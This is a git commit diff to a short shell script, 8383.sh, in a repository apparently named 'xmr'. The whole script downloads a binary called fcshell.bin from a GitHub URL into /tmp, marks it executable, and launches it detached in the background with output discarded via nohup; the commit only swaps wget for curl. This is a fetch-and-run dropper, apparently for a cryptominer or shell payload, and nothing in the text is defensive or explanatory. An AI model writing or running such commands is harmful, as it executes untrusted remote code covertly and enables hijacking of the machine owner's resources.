d5438f326455ff26e38b4eea1a2aea80ea3ea3a0
Pamentierx <64346082+Pamentierx@users.noreply.github.com>
2021-09-18 13:57:09 +0800

    Update 8383.sh

--- 8383.sh
+++ 8383.sh
@@ -1,3 +1,3 @@
-wget -P /tmp/ https://github.com/Pamentierx/xmr/raw/main/fcshell.bin
+curl -L https://github.com/Pamentierx/xmr/raw/main/fcshell.bin -o /tmp/fcshell.bin
 chmod +x /tmp/fcshell.bin
 nohup /tmp/fcshell.bin >/dev/null 2>&1 &
